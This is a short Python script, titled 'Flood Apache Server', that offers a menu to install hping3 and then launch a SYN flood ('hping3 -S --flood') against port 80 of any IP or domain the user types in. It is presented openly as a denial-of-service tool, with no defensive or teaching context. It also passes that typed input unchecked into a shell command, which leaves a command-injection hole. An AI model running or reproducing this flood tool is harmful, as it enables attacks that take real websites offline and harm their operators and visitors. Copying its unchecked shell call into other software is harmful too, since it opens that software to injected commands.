import subprocess

print("                                                           ")
print("--------------------Flood Apache Server--------------------")
print("                                                           ")
while(True):
	print("""
	\033[1;94m
	1- Install hping3
	2- Launch DoS attack whit hping3
	3- Exit
	\033[1;m
	""")

	op=input("\033[1;91m> \033[1;m")

	if op=='1':
		subprocess.call('sudo apt-get install hping3 -y', shell=True)

	elif op=='2':
		ip= input('\033[1;91mGive me a ip or domain: \033[1;m')
		ping= ('hping3 -S --flood -V -p 80  ')
		subprocess.call(ping + ip, shell=True)

	elif op=='3':
		break

	else:
		print("\033[1;93mError!\033[1;m")
